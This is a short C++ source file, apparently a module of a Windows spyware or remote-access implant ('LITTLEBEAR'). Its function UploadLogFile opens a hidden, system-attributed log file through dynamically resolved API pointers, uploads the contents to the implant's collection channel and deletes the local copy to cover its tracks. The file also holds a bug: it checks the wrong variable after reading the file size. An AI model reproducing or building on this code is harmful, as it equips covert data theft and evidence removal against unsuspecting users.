#include <windows.h>
#include "../api.h"
#include "../public.h"
#include "NetWorkdata.h"
#include "log.h"
#include "StrHelper.h"


int __stdcall UploadLogFile() {

	char strFilePath[MAX_PATH] = { 0 };
	int iRet = makeFullFileName(strFilePath, LITTLEBEAR_LOG_FILE_NAME);

	HANDLE hFile = lpCreateFileA(strFilePath, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		writeLog("open log file error\r\n");
		return FALSE;
	}

	int iLen = lpGetFileSize(hFile, 0);
	if (iRet <= 0) {
		lpCloseHandle(hFile);
		return FALSE;
	}
	char* szLogFileInfo = new char[iLen];

	DWORD dwCnt = 0;
	int iRes = lpReadFile(hFile, szLogFileInfo, iLen, &dwCnt, 0);
	lpCloseHandle(hFile);
	if (iRes == FALSE)
	{
		delete[] szLogFileInfo;
		return FALSE;
	}

	iRet = uploadData(szLogFileInfo, iLen, LOGINFORMATIONFILE, 0);

	delete[] szLogFileInfo;

	lpDeleteFileA(strFilePath);
	return TRUE;
}